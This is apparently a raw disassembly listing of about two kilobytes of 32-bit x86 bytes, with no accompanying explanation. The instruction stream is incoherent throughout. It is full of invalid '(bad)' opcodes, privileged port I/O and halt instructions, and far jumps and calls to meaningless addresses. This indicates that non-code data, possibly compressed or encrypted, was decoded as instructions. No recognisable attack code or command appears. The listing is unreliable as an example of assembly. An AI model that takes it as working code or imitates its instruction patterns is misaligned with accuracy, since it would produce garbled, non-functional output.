  42668e:	inc    ebp
  42668f:	jge    0x426656
  426691:	push   ecx
  426692:	cdq    
  426693:	push   esp
  426694:	js     0x4266c7
  426696:	popf   
  426697:	xchg   ebp,eax
  426698:	popf   
  426699:	pop    ds
  42669a:	and    al,0xfb
  42669c:	xor    eax,DWORD PTR [edx-0x6d]
  42669f:	xlat   BYTE PTR ds:[ebx]
  4266a0:	nop
  4266a1:	addr16 jnp 0x4266b0
  4266a4:	test   DWORD PTR [esi-0x28],edx
  4266a7:	mov    eax,0xd11de4fe
  4266ac:	rcr    bh,cl
  4266ae:	jns    0x426642
  4266b0:	sahf   
  4266b1:	dec    esp
  4266b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266b3:	pop    esp
  4266b4:	mov    eax,0x683f7f20
  4266b9:	add    DWORD PTR [ebx+edi*2],edi
  4266bc:	mov    BYTE PTR [esp+edx*4+0x49ab6952],cl
  4266c3:	int    0x91
  4266c5:	enter  0xa8d9,0x0
  4266c9:	pop    es
  4266ca:	stc    
  4266cb:	call   0xbfd7161e
  4266d0:	xchg   ebp,eax
  4266d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266d2:	(bad)  
  4266d3:	aaa    
  4266d4:	out    0xa4,eax
  4266d6:	cs cld 
  4266d8:	cmp    BYTE PTR [edi],cl
  4266da:	xchg   edi,eax
  4266db:	popf   
  4266dc:	call   0xa42153c9
  4266e1:	xchg   BYTE PTR ds:0x6e0839a1,ah
  4266e7:	popf   
  4266e8:	stos   DWORD PTR es:[edi],eax
  4266e9:	(bad)  
  4266ea:	and    bh,cl
  4266ec:	dec    ebx
  4266ed:	mov    dl,al
  4266ef:	inc    esi
  4266f0:	mov    ecx,0xc1b7f3a1
  4266f5:	in     eax,dx
  4266f6:	data16 jle 0x426760
  4266f9:	fcmovu st,st(2)
  4266fb:	retf   
  4266fc:	out    dx,eax
  4266fd:	sti    
  4266fe:	sub    BYTE PTR [edx+edi*1-0x738825ac],al
  426705:	add    dl,al
  426707:	ds addr16 repz pop edx
  42670b:	test   eax,0x4d9911fb
  426710:	or     ebx,DWORD PTR [edx-0x79]
  426713:	inc    ecx
  426714:	mov    ds:0x7e71b571,eax
  426719:	in     eax,dx
  42671a:	cmc    
  42671b:	lods   eax,DWORD PTR ds:[esi]
  42671c:	dec    ebp
  42671d:	loopne 0x426710
  42671f:	(bad)  
  426721:	mov    eax,0x910916bb
  426726:	(bad)  
  426727:	mov    edi,DWORD PTR [ebx+0x21]
  42672a:	aaa    
  42672b:	add    BYTE PTR [edx-0x37],0xc1
  42672f:	xor    eax,0x9abaeea2
  426734:	rol    esp,cl
  426736:	pushf  
  426737:	test   DWORD PTR [ebx+0x2178be58],eax
  42673d:	mov    cl,0x5
  42673f:	imul   edx,DWORD PTR [ecx+ecx*8-0x69890fba],0x64e8da96
  42674a:	dec    ecx
  42674b:	in     al,0x19
  42674d:	call   0x778e335a
  426752:	adc    eax,0x2030bc4a
  426757:	xlat   BYTE PTR ds:[ebx]
  426758:	imul   ecx,DWORD PTR ds:[edi],0x19
  42675c:	pop    es
  42675d:	mov    BYTE PTR [ecx+0x37],cl
  426760:	adc    al,0xe2
  426762:	adc    al,0xa5
  426764:	mov    DWORD PTR [edi+0x51b92cbd],esp
  42676a:	call   0xa0:0xe2d5512c
  426771:	push   ds
  426772:	inc    esp
  426773:	push   0xffffffff
  426775:	cmp    al,0x97
  426777:	cdq    
  426778:	pop    edx
  426779:	cld    
  42677a:	ja     0x42678b
  42677c:	mov    ah,0x5f
  42677e:	sbb    al,0xfb
  426780:	ret    0xb508
  426783:	sub    ebp,DWORD PTR [edx]
  426785:	mov    dl,0xb0
  426787:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426788:	iret   
  426789:	sbb    eax,0x5a8dd725
  42678e:	(bad)  
  426790:	nop
  426791:	and    BYTE PTR [ecx-0xe8b9a3d],cl
  426797:	ret    0x5855
  42679a:	ror    DWORD PTR ds:0x902c2660,0x36
  4267a1:	cmp    eax,0xd3a6da4c
  4267a6:	adc    bh,BYTE PTR [edx+0xf]
  4267a9:	out    dx,eax
  4267aa:	ss xor eax,0x974c7f85
  4267b0:	and    eax,0x4c8d5b97
  4267b5:	fisub  WORD PTR [edx-0x36d5fc99]
  4267bb:	mov    ebx,0x811161b6
  4267c1:	jmp    0x4267fc
  4267c3:	(bad)  
  4267c4:	jno    0x42674d
  4267c6:	cs cli 
  4267c8:	leave  
  4267c9:	mov    es,WORD PTR [ebx-0x126ac965]
  4267cf:	pop    esp
  4267d0:	(bad)  
  4267d1:	scas   eax,DWORD PTR es:[edi]
  4267d2:	dec    esp
  4267d3:	ds jle 0x42678d
  4267d6:	in     eax,dx
  4267d7:	loope  0x4267a0
  4267d9:	das    
  4267da:	aaa    
  4267db:	in     al,dx
  4267dc:	push   es
  4267dd:	or     DWORD PTR [edi],ebx
  4267df:	fidiv  WORD PTR [eax]
  4267e1:	clc    
  4267e2:	in     al,dx
  4267e3:	add    BYTE PTR [edx-0x14],al
  4267e6:	add    DWORD PTR [eax],eax
  4267e8:	sub    al,0x33
  4267ea:	sar    ah,cl
  4267ec:	into   
  4267ed:	jne    0x42683f
  4267ef:	xchg   edi,eax
  4267f0:	sbb    eax,0xcf8fde14
  4267f5:	hlt    
  4267f6:	ret    
  4267f7:	jnp    0x42677f
  4267f9:	or     al,0x2e
  4267fb:	cli    
  4267fc:	cmp    ch,BYTE PTR [edx]
  4267fe:	inc    edx
  4267ff:	cmp    ebx,DWORD PTR [ebp+0x37]
  426802:	jae    0x42685a
  426804:	mov    DWORD PTR [esi-0x65],esi
  426807:	aaa    
  426808:	jle    0x42678e
  42680a:	pop    ss
  42680b:	test   eax,0x26f70bea
  426811:	call   0xc506636a
  426816:	adc    ebp,esp
  426818:	mov    cl,0xda
  42681a:	lods   eax,DWORD PTR ds:[esi]
  42681b:	fiadd  DWORD PTR [ecx+0x3c6d0eb6]
  426821:	ds adc al,0xe1
  426824:	sub    BYTE PTR [ebp-0x3b],al
  426827:	fs push 0xa3241233
  42682d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42682e:	xor    eax,0x58694aff
  426833:	mov    BYTE PTR [eax-0x6f4b5758],dl
  426839:	mov    ds:0x78e5108f,eax
  42683e:	in     al,0xac
  426840:	sub    dh,dh
  426842:	aaa    
  426843:	(bad)  [edi-0x2c02b5f9]
  426849:	aas    
  42684a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42684b:	push   ds
  42684c:	aad    0xb1
  42684e:	mov    edi,0x4f0a19e8
  426853:	(bad)  
  426854:	out    dx,al
  426855:	mov    fs,WORD PTR [edi-0x64]
  426858:	xchg   DWORD PTR [eax],edx
  42685a:	and    BYTE PTR [ebx+ecx*8+0x4e],bh
  42685e:	nop
  42685f:	rcl    BYTE PTR [edx],1
  426861:	shl    DWORD PTR [edi-0x17],cl
  426864:	outs   dx,BYTE PTR ds:[esi]
  426865:	mov    al,0x17
  426867:	and    al,0x5a
  42686a:	imul   ebp,ecx,0x6586339a
  426870:	lahf   
  426871:	enter  0x18b1,0xc5
  426875:	xchg   DWORD PTR [edx+ecx*1-0x33],ebp
  426879:	jae    0x426821
  42687b:	push   cs
  42687c:	jno    0x42685b
  42687e:	outs   dx,DWORD PTR ds:[esi]
  42687f:	xor    BYTE PTR [ebp-0x2e],bh
  426882:	out    0x6a,al
  426884:	popf   
  426885:	ret    0x1e49
  426888:	add    ebp,DWORD PTR [ebp-0x10e2f46f]
  42688e:	adc    al,0x46
  426890:	jae    0x426816
  426892:	addr16 rcr ch,cl
  426895:	xchg   ebx,eax
  426896:	mov    al,ch
  426898:	or     dl,BYTE PTR [ecx]
  42689a:	(bad)
  42689e:	mov    ah,dh
  4268a0:	mov    dl,0x49
  4268a2:	mov    ch,0xfe
  4268a4:	fdiv   DWORD PTR [edx]
  4268a6:	mov    ds:0x1d652694,al
  4268ab:	sub    edi,esp
  4268ad:	(bad)  [edi-0x2fecba15]
  4268b3:	jnp    0x4268f8
  4268b5:	(bad)  
  4268b6:	fnstenv [esi]
  4268b8:	jmp    0x94fb:0x7deeee39
  4268bf:	jmp    0x6b8c:0x7a7bbd51
  4268c6:	sahf   
  4268c7:	mov    ecx,0xe9fc971a
  4268cc:	or     eax,0x8fac1d6a
  4268d1:	mov    al,ds:0x6b9f1a88
  4268d6:	mov    ebx,0x9652ae25
  4268db:	xor    al,0x31
  4268dd:	mov    eax,ds:0xac22bfa9
  4268e2:	push   ds
  4268e3:	pop    esp
  4268e4:	mov    esi,0xccf3d0dd
  4268e9:	push   ecx
  4268ea:	aad    0x70
  4268ec:	(bad)
  4268f0:	fisubr WORD PTR [ecx-0x25]
  4268f3:	das    
  4268f4:	add    ch,bh
  4268f6:	pop    esp
  4268f7:	inc    eax
  4268f8:	out    0x94,al
  4268fa:	lods   eax,DWORD PTR ds:[esi]
  4268fb:	adc    BYTE PTR [edx-0x3cc31e17],ch
  426901:	push   ds
  426902:	loop   0x42696e
  426904:	das    
  426905:	imul   ecx,DWORD PTR [esi+0x62],0xffffffea
  426909:	push   ecx
  42690a:	or     ebx,DWORD PTR [ebp+0x23918f31]
  426910:	ds (bad) 
  426912:	call   0x54bb0ad7
  426917:	nop
  426918:	sti    
  426919:	adc    al,BYTE PTR [edi]
  42691b:	pop    ecx
  42691c:	inc    eax
  42691d:	dec    ecx
  42691e:	push   edx
  42691f:	stc    
  426920:	scas   al,BYTE PTR es:[edi]
  426921:	jbe    0x426908
  426923:	repnz adc al,0xfe
  426926:	xor    bh,BYTE PTR ds:0x5b91e489
  42692c:	out    0x21,eax
  42692e:	add    al,0x51
  426930:	adc    DWORD PTR [eax+edi*8-0x38985d39],ebx
  426937:	es sti 
  426939:	in     eax,dx
  42693a:	sub    eax,0x5b5afc7
  42693f:	xchg   al,bh
  426941:	mov    ebp,0x393f4bd8
  426946:	mov    ds:0x8da5710b,al
  42694b:	pop    esp
  42694c:	lods   al,BYTE PTR ds:[esi]
  42694d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42694e:	out    0xe8,al
  426950:	and    BYTE PTR [ebx-0x7c],0x0
  426954:	stc    
  426955:	imul   edi,DWORD PTR [ebp-0xe03e4d],0x6
  42695c:	pop    esi
  42695d:	mov    edx,0xd0b7983d
  426962:	and    ebx,ecx
  426964:	pop    es
  426965:	mov    BYTE PTR ds:0xa5528e87,bl
  42696b:	(bad)  
  42696d:	xchg   edi,eax
  42696e:	ins    DWORD PTR es:[edi],dx
  42696f:	or     eax,0x532f0d23
  426974:	add    eax,0x56841eb3
  426979:	in     al,0x82
  42697b:	jmp    0x426957
  42697d:	jnp    0x4269af
  42697f:	mov    ds,WORD PTR [ecx-0x3a5100f3]
  426985:	push   eax
  426986:	or     eax,0xc21244f5
  42698b:	push   0x1fad75a3
  426990:	(bad)  
  426991:	sbb    al,0xc3
  426993:	out    0xa7,al
  426995:	push   0x42
  426997:	jbe    0x426930
  426999:	add    al,0x2d
  42699b:	jl     0x426938
  42699d:	imul   esp,DWORD PTR [esi+esi*4-0x7f],0x58
  4269a2:	shr    DWORD PTR [ebx+0x40],cl
  4269a5:	adc    esi,DWORD PTR [edi]
  4269a7:	push   esp
  4269a8:	call   0x4bf9243b
  4269ad:	sub    DWORD PTR [esi],edx
  4269af:	sub    ch,BYTE PTR [edi]
  4269b1:	test   DWORD PTR ds:0x983c1862,esi
  4269b7:	inc    ebx
  4269b8:	mov    esp,0xae1810ad
  4269bd:	int    0xb8
  4269bf:	xchg   ecx,eax
  4269c0:	inc    esp
  4269c1:	sar    DWORD PTR [edi],cl
  4269c3:	cwde   
  4269c4:	jmp    0x6f4818ef
  4269c9:	nop
  4269ca:	pop    eax
  4269cb:	out    dx,al
  4269cc:	je     0x426a0f
  4269ce:	cmp    dh,al
  4269d0:	(bad)  
  4269d1:	pop    edx
  4269d2:	and    al,0xe5
  4269d4:	js     0x426959
  4269d6:	pushf  
  4269d7:	mov    ds,WORD PTR [ebp-0x5fffea25]
  4269dd:	jl     0x4269a1
  4269df:	xchg   edi,eax
  4269e0:	int3   
  4269e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269e2:	out    0x99,al
  4269e4:	es xchg ebp,eax
  4269e6:	push   0xffffffcc
  4269e8:	add    DWORD PTR [esi],esi
  4269ea:	(bad)  
  4269ec:	in     al,dx
  4269ed:	ret    0x503a
  4269f0:	in     al,0x23
  4269f2:	mov    edx,0x7e4b5697
  4269f8:	aaa    
  4269f9:	push   eax
  4269fa:	inc    edx
  4269fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269fc:	cwde   
  4269fd:	and    al,0x75
  4269ff:	xlat   BYTE PTR ds:[ebx]
  426a00:	es mov ecx,esi
  426a03:	mov    ebp,ecx
  426a05:	cmp    eax,0x340c2bd9
  426a0a:	ins    DWORD PTR es:[edi],dx
  426a0b:	sbb    BYTE PTR [edx],bl
  426a0d:	in     al,0xab
  426a0f:	jp     0x42699e
  426a11:	in     al,dx
  426a12:	das    
  426a13:	pusha  
  426a14:	dec    edx
  426a15:	jae    0x426a3b
  426a17:	outs   dx,DWORD PTR ds:[esi]
  426a18:	mov    ds:0x6be5eba5,al
  426a1d:	push   ebx
  426a1e:	mov    esp,edx
  426a20:	loop   0x426a10
  426a22:	sub    BYTE PTR [ecx+0x1c],bh
  426a25:	test   DWORD PTR ds:0xaae82ab9,ebx
  426a2b:	mov    eax,0xfb080c22
  426a30:	push   esp
  426a31:	sbb    ecx,esp
  426a33:	mov    bl,al
  426a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a36:	sbb    BYTE PTR ds:0xbe733750,dh
  426a3c:	into   
  426a3d:	jle    0x426aae
  426a3f:	rol    DWORD PTR [edx+0x53f210ce],0x34
  426a46:	inc    esi
  426a47:	mov    eax,DWORD PTR [ecx]
  426a49:	sbb    al,0xb3
  426a4b:	sub    eax,0x2f81ced
  426a50:	(bad)  
  426a51:	inc    ecx
  426a52:	push   esi
  426a53:	jmp    0x426a7a
  426a55:	out    dx,al
  426a56:	fwait
  426a57:	test   BYTE PTR [eax-0x62],ch
  426a5a:	xlat   BYTE PTR ds:[ebx]
  426a5b:	push   ss
  426a5c:	add    DWORD PTR [edx-0xe9f9a91],ebp
  426a62:	(bad)  
  426a64:	mov    eax,0x445ad842
  426a69:	mov    esp,0x749db093
  426a6e:	scas   eax,DWORD PTR es:[edi]
  426a6f:	adc    eax,0x12cfaafb
  426a74:	arpl   WORD PTR ds:0xa47d205,di
  426a7a:	mov    bh,dh
  426a7c:	dec    esi
  426a7d:	les    esp,FWORD PTR [esi+0x4c]
  426a80:	cmp    ebp,0x4b
  426a83:	shr    DWORD PTR [ecx],0xbc
  426a86:	jecxz  0x426a28
  426a88:	aas    
  426a89:	mov    dl,0x21
  426a8b:	arpl   WORD PTR [esp+eax*8+0x5d],dx
  426a8f:	lds    edi,FWORD PTR [ebx-0x6c48d388]
  426a95:	mov    bl,0xce
  426a97:	out    0x4c,eax
  426a99:	cdq    
  426a9a:	jecxz  0x426a8e
  426a9c:	jne    0x426a82
  426a9e:	scas   al,BYTE PTR es:[edi]
  426a9f:	(bad)  
  426aa0:	push   eax
  426aa1:	fmul   DWORD PTR [edx-0x5d]
  426aa4:	or     BYTE PTR [edi+0x16ba05e7],ah
  426aaa:	pusha  
  426aab:	xlat   BYTE PTR ds:[ebx]
  426aac:	stc    
  426aad:	rcr    DWORD PTR [esi],1
  426aaf:	popf   
  426ab0:	mov    al,BYTE PTR [edx-0x17685edf]
  426ab6:	jne    0x426b12
  426ab8:	mov    ecx,0xae9cc015
  426abd:	mov    ah,0x6a
  426abf:	mov    DWORD PTR [ecx],ebx
  426ac1:	mov    ch,0x6c
  426ac3:	xchg   ebx,eax
  426ac4:	sbb    DWORD PTR [edi],eax
  426ac6:	dec    esp
  426ac7:	call   0xf5c16175
  426acc:	inc    ecx
  426acd:	shl    cl,0xa1
  426ad0:	sbb    DWORD PTR [esi],ecx
  426ad2:	xchg   ebx,eax
  426ad3:	jp     0x426ace
  426ad5:	jl     0x426b3b
  426ad7:	mov    edi,DWORD PTR [ebx]
  426ad9:	adc    eax,0x903adbd9
  426ade:	mov    al,ds:0xebbf60ad
  426ae3:	mov    ch,0xa3
  426ae5:	out    dx,eax
  426ae6:	inc    esp
  426ae7:	cli    
  426ae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ae9:	inc    ebp
  426aea:	sbb    al,0xc5
  426aec:	or     eax,0xad4b215a
  426af1:	jne    0x426aff
  426af3:	jnp    0x426a87
  426af5:	or     BYTE PTR [ebp+0x1897b4d4],0x5
  426afc:	mov    eax,0xf17018b8
  426b01:	pop    ds
  426b02:	dec    esi
  426b03:	shl    DWORD PTR [esp+esi*4-0x7ca8c368],0x8b
  426b0b:	fstp   DWORD PTR [eax+0x7d]
  426b0e:	sar    BYTE PTR [edi],1
  426b10:	call   0x8b9fb3d4
  426b15:	in     eax,dx
  426b16:	mov    eax,0x4546bc9c
  426b1b:	nop
  426b1c:	sub    DWORD PTR [ecx-0x1c106939],edi
  426b22:	shl    BYTE PTR [edx+0x269c7b9],cl
  426b28:	push   ecx
  426b29:	fdivr  st(6),st
  426b2b:	pop    eax
  426b2c:	std    
  426b2d:	iret   
  426b2e:	dec    ebx
  426b2f:	mov    bl,bl
  426b31:	fmul   DWORD PTR [esi+0x23]
  426b34:	and    eax,0x72c622c9
  426b39:	sbb    ah,al
  426b3b:	test   DWORD PTR [edx-0x30543ae5],0x2a7a9dfc
  426b45:	nop
  426b46:	add    BYTE PTR [ebp-0x78],dh
  426b49:	jl     0x426b84
  426b4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b4c:	nop
  426b4d:	cli    
  426b4e:	and    eax,0x45cc87f4
  426b53:	sbb    BYTE PTR [esi-0x26],0xa4
  426b57:	mov    es,esp
  426b59:	shr    DWORD PTR [esi],1
  426b5b:	mov    bl,0x5e
  426b5d:	xchg   edx,eax
  426b5e:	fwait
  426b5f:	mov    ebx,0x11047f3
  426b64:	inc    esi
  426b65:	adc    edx,ecx
  426b67:	xor    edx,edx
  426b69:	cmc    
  426b6a:	or     al,0x30
  426b6c:	cmp    al,0xfd
  426b6e:	and    bh,BYTE PTR [esi]
  426b70:	scas   eax,DWORD PTR es:[edi]
  426b71:	add    eax,0x427c5eed
  426b76:	mov    eax,0xa7874c7a
  426b7b:	cli    
  426b7c:	std    
  426b7d:	scas   eax,DWORD PTR es:[edi]
  426b7e:	cmp    eax,0xcb11eae2
  426b83:	add    BYTE PTR [eax],al
  426b85:	add    BYTE PTR [eax],al
  426b87:	add    BYTE PTR [eax],al
  426b89:	add    BYTE PTR [edi+0x56],al
  426b8c:	dec    esp
  426b8d:	inc    edx
  426b8e:	pop    ebp
  426b8f:	pop    edx
  426b90:	dec    edi
  426b91:	push   edi
  426b92:	dec    edx
  426b93:	push   es
  426b94:	enter  0xe881,0xdf
  426b98:	rcr    BYTE PTR [ebp-0x1d],1
  426b9b:	clc    
  426b9c:	add    DWORD PTR [eax],eax
  426b9e:	add    DWORD PTR [esi],0x1b6e0000
  426ba4:	and    DWORD PTR ds:[ebx-0x5f55ea92],esp
  426bab:	add    al,0x9c
  426bad:	add    BYTE PTR [esi+0x65b24d99],bh
  426bb3:	xchg   ecx,eax
  426bb4:	gs jb  0x426bbf
  426bb7:	push   0xffffff9a
  426bb9:	mov    cl,0xdb
  426bbb:	mov    ebx,0xc4b01ecf
  426bc0:	mov    ecx,0x7ae1f8d6
  426bc5:	xlat   BYTE PTR ds:[ebx]
  426bc6:	icebp  
  426bc7:	cmc    
  426bc8:	mov    fs,WORD PTR [ebp-0x35dbb07]
  426bce:	aam    0xaf
  426bd0:	addr16 dec ebx
  426bd2:	cmc    
  426bd3:	mov    ebx,0xda4603e4
  426bd8:	fcomp  DWORD PTR [ebp+0x740e4cd9]
  426bde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426bdf:	mov    dh,0xa6
  426be1:	mov    ebp,DWORD PTR [edx+0x69]
  426be4:	jmp    0x9cb75387
  426be9:	pop    esp
  426bea:	sub    eax,0xe796c73c
  426bef:	cmp    edi,DWORD PTR [edi-0x6c]
  426bf2:	push   eax
  426bf3:	pop    edi
  426bf4:	push   eax
  426bf5:	icebp  
  426bf6:	cmp    eax,0x71055a1e
  426bfb:	(bad)  
  426bfc:	addr16 hlt 
  426bfe:	sbb    al,0x54
  426c00:	mov    DWORD PTR [edi+0x2e],esp
  426c03:	cmp    al,0x36
  426c05:	jnp    0x426bd8
  426c07:	out    dx,eax
  426c08:	gs pop ax
  426c0b:	sub    al,0x3b
  426c0d:	das    
  426c0e:	adc    al,0x55
  426c10:	pop    ss
  426c11:	imul   esi,DWORD PTR ds:0x8c5f03d0,0xd63b3ca1
  426c1b:	nop
  426c1c:	xlat   BYTE PTR ds:[ebx]
  426c1d:	or     ecx,DWORD PTR [edx+0x24d540d2]
  426c23:	aad    0xd0
  426c25:	mov    al,ds:0x1482b240
  426c2a:	jbe    0x426bef
  426c2c:	adc    al,0x25
  426c2e:	or     BYTE PTR [edi+0x4e],dh
  426c31:	inc    edx
  426c32:	and    al,0x54
  426c34:	mov    BYTE PTR [esi-0x3c543fcb],cl
  426c3a:	mov    cl,0xcd
  426c3c:	mov    bh,0xd6
  426c3e:	les    eax,FWORD PTR [ebx+0xaf06dff]
  426c44:	and    DWORD PTR [edx+0x72ae176a],ebp
  426c4a:	mov    al,0xad
  426c4c:	in     eax,0x93
  426c4e:	push   ss
  426c4f:	pop    ss
  426c50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c51:	inc    BYTE PTR [esi+0x23475bbc]
  426c57:	jg     0x426c72
  426c59:	sbb    BYTE PTR [ebp-0x5d],0xfe
  426c5d:	loop   0x426c0f
  426c5f:	outs   dx,DWORD PTR ds:[esi]
  426c60:	gs call 0x583ae42
  426c66:	and    eax,0x4d7c2dda
  426c6b:	fst    QWORD PTR [ebx]
  426c6d:	jns    0x426c49
  426c6f:	(bad)  
  426c70:	jle    0x426c47
  426c72:	scas   al,BYTE PTR es:[edi]
  426c73:	mov    ch,0xb2
  426c75:	sbb    esp,esp
  426c77:	mov    ebp,0xbe99f385
  426c7c:	fnstsw WORD PTR [ebx-0x20]
  426c7f:	imul   edi,esi,0x64
  426c82:	xor    al,0x16
  426c84:	and    DWORD PTR [edi-0x4a],esp
  426c87:	xor    edi,DWORD PTR [eax]
  426c89:	adc    ebx,esi
  426c8b:	adc    BYTE PTR [esi],ah
  426c8d:	in     eax,dx
  426c8e:	pop    eax
  426c8f:	sbb    eax,0x1cf382e7
  426c94:	iret   
  426c95:	sbb    ebp,DWORD PTR [ecx-0x52]
  426c98:	aam    0x5d
  426c9a:	stc    
  426c9b:	cmp    BYTE PTR [ebp+ebx*1+0x3e761e62],dl
  426ca2:	sti    
  426ca3:	or     dh,BYTE PTR ds:0x4057724e
  426ca9:	pop    ebx
  426caa:	push   es
  426cab:	out    0x4c,al
  426cad:	loope  0x426cc9
  426caf:	or     DWORD PTR ds:0x1491dd7f,esp
  426cb5:	ds (bad) 
  426cb8:	outs   dx,BYTE PTR ds:[esi]
  426cb9:	dec    edi
  426cba:	xchg   esp,eax
  426cbb:	adc    BYTE PTR [ecx+0x15b449c4],ch
  426cc1:	inc    ebp
  426cc2:	mov    al,0x6c
  426cc4:	fwait
  426cc5:	mov    cl,0x11
  426cc7:	and    eax,0xe2aa70b5
  426ccc:	mov    al,0xfc
  426cce:	mov    DWORD PTR [esi-0x1d7b9e1f],edx
  426cd4:	fisubr WORD PTR [esi+0x17]
  426cd7:	jl     0x426cba
  426cd9:	scas   eax,DWORD PTR es:[edi]
  426cda:	mov    eax,0xc4a72cf4
  426cdf:	aas    
  426ce0:	test   DWORD PTR [edi],esp
  426ce2:	(bad)  [ebp+0x59dd7f11]
  426ce8:	into   
  426ce9:	stc    
  426cea:	gs xchg edx,eax
  426cec:	sub    al,0x64
  426cee:	call   0xa373fe06
  426cf3:	vmovd  xmm7,DWORD PTR ds:0xc1665aa8
  426cfb:	pop    ebx
  426cfc:	cmp    dl,cl
  426cfe:	xor    al,0xc0
  426d00:	sti    
  426d01:	mov    ds:0xa8371ba3,eax
  426d06:	sub    ebp,eax
  426d08:	out    dx,eax
  426d09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d0a:	or     esp,edx
  426d0c:	fbld   TBYTE PTR [esp+eiz*2-0x6092bcfd]
  426d13:	sub    dh,0xf8
  426d16:	mov    al,0xbc
  426d18:	add    BYTE PTR ds:0x179e7379,ch
  426d1e:	ret    
  426d1f:	test   DWORD PTR [ecx-0x6aca7601],edi
  426d25:	xor    ah,bl
  426d27:	cmp    DWORD PTR [ecx],esi
  426d29:	pop    ebp
  426d2a:	fld    QWORD PTR [edx+0x52b5cd6a]
  426d30:	fs pop edi
  426d32:	mov    esi,0x54482c24
  426d37:	add    al,0x32
  426d39:	mov    eax,0x1fee8a84
  426d3e:	dec    ebx
  426d3f:	call   0x926eb65d
  426d44:	add    DWORD PTR [esi],edx
  426d46:	ss out dx,eax
  426d48:	into   
  426d49:	sbb    al,0x65
  426d4b:	jmp    0xc2f16383
  426d50:	jmp    0xad45cc5f
  426d55:	add    eax,0x5d94861b
  426d5a:	out    dx,al
  426d5b:	daa    
  426d5c:	pushf  
  426d5d:	dec    ebx
  426d5e:	rcr    DWORD PTR [esp+edx*4-0x24194a44],1
  426d65:	ds inc al
  426d68:	pop    esp
  426d69:	jne    0x426d9c
  426d6b:	int    0x99
  426d6d:	or     edx,0x1c8c91cd
  426d73:	gs pop eax
  426d75:	(bad)  
  426d76:	int    0xde
  426d78:	fsub   DWORD PTR [eax]
  426d7a:	(bad)  
  426d7b:	sbb    eax,0x28598572
  426d80:	sbb    eax,0x863d4c72
  426d85:	lahf   
  426d86:	sbb    eax,0x2947090f
  426d8b:	into   
  426d8c:	jne    0x426dce
  426d8e:	inc    esi
  426d8f:	iret   
  426d90:	hlt    
  426d91:	(bad)  
  426d92:	and    cl,BYTE PTR [esp+edi*1]
  426d95:	aam    0xb2
  426d97:	mov    esi,0x7395b39a
  426d9c:	shr    DWORD PTR [ebx],0x12
  426d9f:	dec    ebp
  426da0:	(bad)  
  426da1:	(bad)  
  426da2:	push   esp
  426da3:	pop    esp
  426da4:	add    dl,ah
  426da6:	(bad)  
  426da7:	jmp    0x426d60
  426da9:	cmp    al,0x5b
  426dab:	retf   
  426dac:	xor    eax,0x460d0269
  426db1:	mov    dl,0x3d
  426db3:	jecxz  0x426ded
  426db5:	mov    bh,0x5e
  426db7:	push   ds
  426db8:	mov    dh,0xba
  426dba:	sub    al,0xaa
  426dbc:	sub    BYTE PTR [eax-0x6590952d],cl
  426dc2:	cmc    
  426dc3:	fsub   QWORD PTR [edx]
  426dc5:	sbb    DWORD PTR ds:0xa2bf0601,ebx
  426dcb:	push   cs
  426dcc:	loope  0x426d64
  426dce:	rol    BYTE PTR [ebp+0x26],0x43
  426dd2:	cmp    ebx,DWORD PTR ds:0x55c7b807
  426dd8:	jmp    0x426e49
  426dda:	imul   ebx,DWORD PTR [esp],0x70
  426dde:	dec    esi
  426ddf:	mov    esi,0xe18914ce
  426de4:	and    edi,DWORD PTR [ecx+0x47da84ec]
  426dea:	arpl   bp,cx
  426dec:	xchg   ebx,eax
  426ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426dee:	leave  
  426def:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426df0:	das    
  426df1:	sbb    BYTE PTR [edi],dh
  426df3:	jmp    DWORD PTR [ecx]
  426df5:	mov    WORD PTR [eax-0x24a4ea64],fs
  426dfb:	add    cl,BYTE PTR [eax]
  426dfd:	and    al,0xdc
  426dff:	in     al,dx
  426e00:	mov    eax,ds:0x83f6d1ef
  426e05:	sub    dh,dh
  426e07:	sub    eax,0xd9e0b57d
  426e0c:	jmp    0x2731a751
  426e11:	loopne 0x426dfe
  426e13:	gs xor al,0x1b
  426e16:	fsubr  st,st(0)
  426e18:	lods   eax,DWORD PTR ds:[esi]
  426e19:	aaa    
  426e1a:	(bad)  
  426e1b:	mov    ecx,0x84db3be9
  426e20:	or     edx,DWORD PTR [esi]
  426e22:	xchg   ebx,eax
  426e23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e24:	sahf   
  426e25:	lods   al,BYTE PTR ds:[esi]
  426e26:	inc    ebp
  426e27:	outs   dx,DWORD PTR ds:[esi]
  426e28:	(bad)  
  426e29:	in     al,dx
  426e2a:	mov    ebx,0xacd61df9
  426e2f:	test   al,0xb3
  426e31:	dec    ecx
  426e32:	jne    0x426e7b
  426e34:	cmp    ebp,DWORD PTR [edi-0x7598f1b6]
  426e3a:	cmp    DWORD PTR [ebp+ecx*2-0x29],ebp
  426e3e:	int    0x91
  426e40:	daa    
  426e41:	out    0x8a,eax
  426e43:	lock fmul st(6),st
  426e46:	outs   dx,DWORD PTR ds:[esi]
  426e47:	imul   eax,edx,0x3417e96c
  426e4d:	stos   BYTE PTR es:[edi],al
  426e4e:	sbb    eax,0xcaeb9bc5
  426e53:	lds    esp,FWORD PTR [esi+0x33]
  426e56:	pop    es
  426e57:	add    DWORD PTR [esi+0x44e28716],ebp
  426e5d:	std    
  426e5e:	sbb    DWORD PTR ds:0x4b3b073c,eax
  426e64:	jo     0x426e0f
  426e66:	mov    eax,0x9716e29c
  426e6b:	add    al,0x2e
  426e6d:	mov    di,0xaf70
  426e71:	inc    edi
  426e72:	pop    ecx
  426e73:	adc    al,0xd3
